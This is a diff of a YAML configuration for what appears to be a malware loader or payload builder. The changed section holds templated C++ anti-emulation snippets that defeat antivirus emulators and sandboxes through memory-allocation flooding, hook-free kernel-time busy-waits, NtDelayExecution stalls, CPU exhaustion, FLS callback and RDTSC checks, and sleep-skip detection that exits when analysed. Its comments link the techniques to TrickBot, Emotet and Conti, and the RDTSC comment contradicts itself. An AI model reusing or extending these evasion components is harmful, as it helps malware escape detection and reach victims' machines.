@@ -9,6 +9,7 @@ sections:
     default: false
     snippet: |
       // No anti-emulation
+
   - id: SirAllocALot
     display: SirAllocALot (Memory Exhaustion)
     default: true
@@ -16,56 +17,51 @@ sections:
     - id: sir_alloc_count
       label: "Allocation Count"
       type: textbox
-      defaultValue: "100"
-      placeholder: "100"
+      defaultValue: "200"
+      placeholder: "200"
     - id: sir_iteration_count
       label: "Iterations"
       type: textbox
-      defaultValue: "5"
-      placeholder: "5"
+      defaultValue: "3"
+      placeholder: "3"
     - id: sir_alloc_size
       label: "Alloc Size (bytes)"
       type: textbox
       defaultValue: "4096"
       placeholder: "4096"
     snippet: |
-      // Anti-emulation: Exhaust emulator with memory allocations
-      // Allocates many RW regions, sets to RX, then frees - repeated multiple times
-      // This overwhelms AV emulators (memory limits, API call limits, or time limits)
+      // Anti-emulation: Memory Allocation Exhaustion (SirAllocALot)
+      // Floods the emulator with VirtualAlloc calls across multiple iterations.
+      // AV emulators have finite memory and API-call budgets — this overflows both.
+      // Technique seen in: TrickBot, Ursnif, Emotet and many others.
       {
-          const int SIR_ALLOC_COUNT = $sir_alloc_count$;
-          const int SIR_ITERATION_COUNT = $sir_iteration_count$;
-          const int ALLOC_SIZE = $sir_alloc_size$;
-          void** allocs = new void*[$sir_alloc_count$]{};
-          DWORD result;
+          const int  COUNT  = $sir_alloc_count$;
+          const int  ITERS  = $sir_iteration_count$;
+          const int  SIZE   = $sir_alloc_size$;
+          void**     allocs = new void*[COUNT]{};
+          DWORD      prot;
 
-          for(int i = 0; i < SIR_ITERATION_COUNT; i++) {
-              for(int n = 0; n < SIR_ALLOC_COUNT; n++) {
-                  allocs[n] = VirtualAlloc(NULL, ALLOC_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          for (int i = 0; i < ITERS; i++) {
+              // Allocate and dirty every page to force real memory pressure
+              for (int n = 0; n < COUNT; n++) {
+                  allocs[n] = VirtualAlloc(NULL, SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                   if (allocs[n]) {
-                      char *ptr = (char*)allocs[n];
-                      for(int j = 0; j < ALLOC_SIZE; j++) {
-                          ptr[j] = 0x23;
-                      }
+                      volatile BYTE* p = (BYTE*)allocs[n];
+                      for (int j = 0; j < SIZE; j += 256) p[j] = (BYTE)(j ^ i ^ n);
                   }
               }
-
-              for(int n = 0; n < SIR_ALLOC_COUNT; n++) {
-                  if (allocs[n]) {
-                      VirtualProtect(allocs[n], ALLOC_SIZE, PAGE_EXECUTE_READ, &result);
-                  }
-              }
-
-              for(int n = 0; n < SIR_ALLOC_COUNT; n++) {
-                  if (allocs[n]) {
-                      VirtualFree(allocs[n], 0, MEM_RELEASE);
-                  }
-              }
+              // Flip all pages to RX — triggers emulator permission-change tracking
+              for (int n = 0; n < COUNT; n++)
+                  if (allocs[n]) VirtualProtect(allocs[n], SIZE, PAGE_EXECUTE_READ, &prot);
+              // Free all
+              for (int n = 0; n < COUNT; n++)
+                  if (allocs[n]) VirtualFree(allocs[n], 0, MEM_RELEASE);
           }
           delete[] allocs;
       }
+
   - id: TimeRawKernel
-    display: Time Delay (Kernel Time Register)
+    display: Kernel Time Busy-Wait (KUSER_SHARED_DATA)
     default: false
     inputs:
     - id: time_raw_kernel_ms
@@ -74,27 +70,23 @@ sections:
       defaultValue: "3000"
       placeholder: "3000"
     snippet: |
-      // Anti-emulation: Busy sleep using kernel time register
-      // Uses memory address 0x7ffe0004 which is not affected by Sleep() hooks
+      // Anti-emulation: Busy-wait using the kernel time register in KUSER_SHARED_DATA.
+      // Reads TickCount directly from the read-only shared user page at 0x7FFE0000.
+      // Completely bypasses Sleep() / NtDelayExecution hooks — no API calls made.
+      // Formula: ms = (TickCount.LowPart * TickCountMultiplier) >> 24  (= GetTickCount())
       {
-          auto get_time_raw = []() -> DWORD {
-              ULONG* PUserSharedData_TickCountMultiplier = (ULONG*)0x7ffe0004;
-              LONG* PUserSharedData_High1Time = (LONG*)0x7ffe0324;
-              ULONG* PUserSharedData_LowPart = (ULONG*)0x7ffe0320;
-              DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +
-                  ((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);
-              return kernelTime;
+          auto get_ms = []() -> DWORD {
+              ULONG mult  = *(volatile ULONG*)0x7ffe0004;  // KUSER_SHARED_DATA.TickCountMultiplier
+              ULONG ticks = *(volatile ULONG*)0x7ffe0320;  // KUSER_SHARED_DATA.TickCount.LowPart
+              return (DWORD)(((ULONGLONG)ticks * mult) >> 24);
           };
 
-          auto sleep_raw_ms = [&get_time_raw](DWORD sleeptime) {
-              DWORD start = get_time_raw();
-              while (get_time_raw() - start < sleeptime) {}
-          };
-
-          sleep_raw_ms($time_raw_kernel_ms$);
+          DWORD start = get_ms();
+          while ((get_ms() - start) < (DWORD)$time_raw_kernel_ms$) {}
       }
-  - id: DelayExecNtDelayExecution
-    display: Delay via NtDelayExecution
+
+  - id: NtDelayExecution
+    display: NtDelayExecution (Direct NTAPI Delay)
     default: false
     inputs:
     - id: nt_delay_seconds
@@ -103,193 +95,113 @@ sections:
       defaultValue: "5"
       placeholder: "5"
     snippet: |
-      // Anti-emulation: Direct syscall delay that cannot be easily hooked
+      // Anti-emulation: Delay via NtDelayExecution — harder to hook than Sleep().
+      // Passes a negative LARGE_INTEGER (relative time expressed in 100ns intervals).
+      // Used by Conti, Emotet, and many modern loaders as a reliable stalling primitive.
       {
-          typedef NTSTATUS (NTAPI *pNtDelayExecution)(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
+          typedef NTSTATUS (NTAPI* pfnNtDelayExecution)(BOOLEAN Alertable, PLARGE_INTEGER Interval);
+          LARGE_INTEGER delay = {};
+          delay.QuadPart = -((LONGLONG)$nt_delay_seconds$ * 10000000LL);  // seconds to 100ns (negative = relative)
           HMODULE ntdll = GetModuleHandleA("ntdll.dll");
           if (ntdll) {
-              pNtDelayExecution NtDelayExec = (pNtDelayExecution)GetProcAddress(ntdll, "NtDelayExecution");
-              if (NtDelayExec) {
-                  LARGE_INTEGER delay;
-                  delay.QuadPart = -(LONGLONG)$nt_delay_seconds$ * 10000000LL; // seconds to 100ns intervals (negative = relative)
-                  NtDelayExec(FALSE, &delay);
-              }
+              auto fn = (pfnNtDelayExecution)GetProcAddress(ntdll, "NtDelayExecution");
+              if (fn) fn(FALSE, &delay);
           }
       }
+
   - id: HeavyComputation
-    display: Heavy Computation (CPU Exhaustion)
+    display: Heavy Computation (CPU Cycle Exhaustion)
     default: false
     inputs:
     - id: heavy_comp_iterations
       label: "Iterations"
       type: textbox
-      defaultValue: "50000000"
-      placeholder: "50000000"
-    snippet: |
-      // Anti-emulation: Heavy computation to exhaust emulator cycles
-      {
-          volatile unsigned int result = 0;
-          for (unsigned int i = 0; i < $heavy_comp_iterations$; i++) {
-              result ^= i;
-              result = (result << 1) | (result >> 31);
-              result += i * 7;
-          }
-          // Use result to prevent optimization
-          if (result == 0xDEADBEEF) return 1;
-      }
-  - id: FlsCallbacks
-    display: FLS Callback Abuse
-    default: false
-    snippet: "// Anti-emulation: Abuse FLS (Fiber Local Storage) callbacks\n// Many emulators don't properly implement FLS callbacks\n{\n    volatile BOOL flsCalled = FALSE;\n    auto flsCallback = [](PVOID lpFlsData) -> VOID {\n        *(volatile BOOL*)lpFlsData = TRUE;\n    };\n    \n    DWORD flsIndex = FlsAlloc((PFLS_CALLBACK_FUNCTION)flsCallback);\n    if (flsIndex != FLS_OUT_OF_INDEXES) {\n        FlsSetValue(flsIndex, (PVOID)&flsCalled);\n        FlsFree(flsIndex);\n        \n        if (!flsCalled) {\n            // FLS callback wasn't called - likely in emulator\n            return 0;\n        }\n    }\n}\n"
-  - id: MaxMemoryExhaustion
-    display: Maximum Memory Exhaustion
-    default: true
-    inputs:
-    - id: max_mem_count
-      label: "Allocation Count"
-      type: textbox
-      defaultValue: "250"
-      placeholder: "250"
-    - id: max_mem_iters
-      label: "Iterations"
-      type: textbox
-      defaultValue: "15"
-      placeholder: "15"
-    - id: max_mem_size
-      label: "Alloc Size (bytes)"
-      type: textbox
-      defaultValue: "32768"
-      placeholder: "32768"
-    snippet: "// Maximum memory allocation stress\n{\n    const int COUNT = $max_mem_count$;\n    const int ITERS = $max_mem_iters$;\n    const int SIZE = $max_mem_size$;\n    void** allocs = new void*[$max_mem_count$]{};\n    DWORD prot;\n    \n    for(int iter = 0; iter < ITERS; iter++) {\n        for(int n = 0; n < COUNT; n++) {\n            allocs[n] = VirtualAlloc(NULL, SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n            if (allocs[n]) {\n                volatile BYTE *p = (BYTE*)allocs[n];\n                for(int j = 0; j < SIZE; j += 256) {\n                    p[j] = (BYTE)((j * iter) ^ n);\n                }\n            }\n        }\n        for(int n = 0; n < COUNT; n++) {\n            if (allocs[n]) VirtualProtect(allocs[n], SIZE, PAGE_EXECUTE_READ, &prot);\n        }\n        for(int n = 0; n < COUNT; n++) {\n            if (allocs[n]) VirtualFree(allocs[n], 0, MEM_RELEASE);\n        }\n    }\n    delete[] allocs;\n}\n"
-  - id: ExtendedTimeDelay
-    display: Extended Time Delay
-    default: true
-    inputs:
-    - id: ext_delay_ms
-      label: "Delay (ms)"
-      type: textbox
-      defaultValue: "15000"
-      placeholder: "15000"
-    snippet: |
-      // Busy delay to defeat time-limited emulators
-      {
-          DWORD start = *(DWORD*)0x7ffe0320;
-          while (*(DWORD*)0x7ffe0320 - start < $ext_delay_ms$) {
-              volatile int x = 0;
-              for (int i = 0; i < 10000; i++) x += i;
-          }
-      }
-  - id: CpuStress
-    display: CPU Stress Test
-    default: true
-    inputs:
-    - id: cpu_stress_iterations
-      label: "Iterations"
-      type: textbox
-      defaultValue: "200000000"
-      placeholder: "200000000"
-    snippet: |
-      // Heavy CPU computation
-      {
-          volatile unsigned int r = 0xDEADBEEF;
-          for (unsigned int i = 0; i < $cpu_stress_iterations$; i++) {
-              r = (r << 1) | (r >> 31);
-              r ^= i;
-              r = (r * 7) + 13;
-          }
-          if (r == 0) Sleep(1);
-      }
-  - id: FLSStress
-    display: FLS Callback Stress
-    default: false
-    snippet: |
-      // Stress FLS callbacks
-      {
-          for (int round = 0; round < 50; round++) {
-              volatile BOOL called = FALSE;
-              auto cb = [](PVOID p) -> VOID { *(volatile BOOL*)p = TRUE; };
-              DWORD idx = FlsAlloc((PFLS_CALLBACK_FUNCTION)cb);
-              if (idx != FLS_OUT_OF_INDEXES) {
-                  FlsSetValue(idx, (PVOID)&called);
-                  FlsFree(idx);
-                  if (!called) return 0;
-              }
-          }
-      }
-  - id: ExtremeSirAlloc
-    display: Extreme Memory Exhaustion
-    default: true
-    inputs:
-    - id: extreme_alloc_count
-      label: "Allocation Count"
-      type: textbox
-      defaultValue: "200"
-      placeholder: "200"
-    - id: extreme_alloc_iters
-      label: "Iterations"
-      type: textbox
-      defaultValue: "10"
-      placeholder: "10"
-    - id: extreme_alloc_size
-      label: "Alloc Size (bytes)"
-      type: textbox
-      defaultValue: "16384"
-      placeholder: "16384"
-    snippet: "// Extreme memory allocation to crash emulators\n{\n    const int COUNT = $extreme_alloc_count$;\n    const int ITERS = $extreme_alloc_iters$;\n    void** allocs = new void*[$extreme_alloc_count$]{};\n    DWORD prot;\n    \n    for(int iter = 0; iter < ITERS; iter++) {\n        for(int n = 0; n < COUNT; n++) {\n            allocs[n] = VirtualAlloc(NULL, $extreme_alloc_size$, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n            if (allocs[n]) {\n                volatile BYTE *p = (BYTE*)allocs[n];\n                for(int j = 0; j < $extreme_alloc_size$; j += 128) {\n                    p[j] = (BYTE)(j ^ iter ^ n);\n                }\n            }\n        }\n        for(int n = 0; n < COUNT; n++) {\n            if (allocs[n]) VirtualProtect(allocs[n], $extreme_alloc_size$, PAGE_EXECUTE_READ, &prot);\n        }\n        for(int n = 0; n < COUNT; n++) {\n            if (allocs[n]) VirtualFree(allocs[n], 0, MEM_RELEASE);\n        }\n    }\n    delete[] allocs;\n}\n"
-  - id: LongDelay
-    display: Extended Time Delay
-    default: false
-    inputs:
-    - id: long_delay_ms
-      label: "Delay (ms)"
-      type: textbox
-      defaultValue: "10000"
-      placeholder: "10000"
-    snippet: |
-      // Busy delay to defeat time-limited emulators
-      {
-          DWORD start = *(DWORD*)0x7ffe0320;
-          while (*(DWORD*)0x7ffe0320 - start < $long_delay_ms$) {
-              volatile int x = 0;
-              for (int i = 0; i < 1000; i++) x += i;
-          }
-      }
-  - id: TimeRaw
-    display: Kernel Time Delay
-    default: true
-    inputs:
-    - id: time_raw_ms
-      label: "Delay (ms)"
-      type: textbox
-      defaultValue: "5000"
-      placeholder: "5000"
-    snippet: |
-      // Busy wait using kernel time register
-      {
-          auto get_time = []() -> DWORD {
-              return *(DWORD*)0x7ffe0320;
-          };
-          DWORD start = get_time();
-          while (get_time() - start < $time_raw_ms$) {}
-      }
-  - id: CpuIntensive
-    display: CPU Exhaustion
-    default: false
-    inputs:
-    - id: cpu_intensive_iterations
-      label: "Iterations"
-      type: textbox
       defaultValue: "100000000"
       placeholder: "100000000"
     snippet: |
-      // Heavy computation to exhaust emulator cycles
+      // Anti-emulation: CPU cycle exhaustion — most emulators cap instruction counts.
+      // Mixes rotation, XOR, and prime multiplication so the loop resists optimization.
+      // Technique observed in Lazarus Group loaders and various nation-state implants.
       {
-          volatile unsigned int r = 0x12345678;
-          for (unsigned int i = 0; i < $cpu_intensive_iterations$; i++) {
-              r = (r << 1) | (r >> 31);
+          volatile ULONG r = 0xDEADBEEF;
+          for (ULONG i = 0; i < (ULONG)$heavy_comp_iterations$; i++) {
+              r = (r << 1) | (r >> 31);    // rotate left 1
               r ^= i;
+              r = (r * 1000003UL) + 13UL;  // prime multiplier keeps distribution wide
           }
-          if (r == 0) Sleep(1);
+          if (r == 0) Sleep(1);  // opaque use prevents dead-code elimination
+      }
+
+  - id: FlsCallbacks
+    display: FLS Callback Abuse
+    default: false
+    snippet: |
+      // Anti-emulation: Verify FLS (Fiber Local Storage) callbacks execute correctly.
+      // Many AV emulators do not properly implement the FLS destructor callback mechanism.
+      // If the callback is never fired after FlsFree(), we are likely being emulated.
+      // Technique documented by: Checkpoint Research, BlackHat 2019.
+      {
+          volatile BOOL called = FALSE;
+          auto cb = [](PVOID data) -> VOID {
+              *(volatile BOOL*)data = TRUE;
+          };
+
+          DWORD idx = FlsAlloc((PFLS_CALLBACK_FUNCTION)cb);
+          if (idx != FLS_OUT_OF_INDEXES) {
+              FlsSetValue(idx, (PVOID)&called);
+              FlsFree(idx);
+              if (!called) ExitProcess(0);  // callback was never invoked — emulator detected
+          }
+      }
+
+  - id: RdtscTiming
+    display: RDTSC Cycle Timing Check
+    default: false
+    includes: "#include <intrin.h>"
+    inputs:
+    - id: rdtsc_min_cycles
+      label: "Min Expected Cycles"
+      type: textbox
+      defaultValue: "500000"
+      placeholder: "500000"
+    snippet: |
+      // Anti-emulation: RDTSC timing check — emulators run orders of magnitude slower.
+      // We measure the CPU cycle cost of a known workload. On bare metal this is fast;
+      // inside an emulator the same work takes far fewer "emulated" cycles,
+      // or the counter behaves inconsistently across the emulated instruction stream.
+      {
+          volatile ULONG work = 0;
+          unsigned __int64 t1 = __rdtsc();
+          for (volatile int i = 0; i < 100000; i++) work += (ULONG)i;
+          unsigned __int64 t2 = __rdtsc();
+          if ((t2 - t1) < (unsigned __int64)$rdtsc_min_cycles$) {
+              ExitProcess(0);  // cycle delta is impossibly small — emulator detected
+          }
+      }
+
+  - id: SleepSkipCheck
+    display: Sleep Skip Detection
+    default: false
+    inputs:
+    - id: sleep_check_ms
+      label: "Sleep Duration (ms)"
+      type: textbox
+      defaultValue: "1500"
+      placeholder: "1500"
+    snippet: |
+      // Anti-emulation: Detect if Sleep() was fast-forwarded by a sandbox/emulator.
+      // Emulators and sandboxes commonly patch Sleep() to return immediately in order
+      // to speed up analysis. We verify via QueryPerformanceCounter that real time passed.
+      {
+          LARGE_INTEGER freq, t1, t2;
+          QueryPerformanceFrequency(&freq);
+          QueryPerformanceCounter(&t1);
+          Sleep($sleep_check_ms$);
+          QueryPerformanceCounter(&t2);
+          DWORD elapsed_ms = (DWORD)(((t2.QuadPart - t1.QuadPart) * 1000LL) / freq.QuadPart);
+          if (elapsed_ms < (DWORD)($sleep_check_ms$ / 2)) {
+              ExitProcess(0);  // sleep was skipped — sandbox/emulator detected
+          }
       }
 - header: Anti Analysis
   template: antianalysis
